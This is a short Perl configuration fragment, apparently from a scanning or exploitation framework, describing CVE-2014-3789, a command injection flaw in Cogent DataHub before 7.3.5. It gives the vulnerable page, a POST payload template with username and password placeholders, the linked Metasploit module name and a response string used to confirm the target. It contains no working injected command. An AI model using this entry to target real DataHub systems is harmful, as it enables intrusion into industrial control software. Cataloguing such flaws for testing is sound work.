my $EXPLOIT = {
  CVE => "CVE-2014-3789",
  DESCRIPTION => "

        This module exploits an injection vulnerability in Cogent DataHub prior

        to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which

        makes insecure use of the datahub_command function with user controlled

        data, allowing execution of arbitrary datahub commands and scripts. This

        module has been tested successfully with Cogent DataHub 7.3.4 on

        Windows 7 SP1. Please also note that after exploitation, the remote service

        will most likely hang and restart manually.

      ",
  METHOD => "POST",
  MSF_MODULE => "cogent_datahub_command",
  PATHS => [""],
  PAYLOAD => "username=__USERNAME__&password=__PASSWORD__&",
  TITLE => "Cogent DataHub Command Injection",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The URI to use (do not change)", VALUE => "/" },
  },
      },  VALIDATION => {
    'TSTRING' =>       "PermissionRecord",
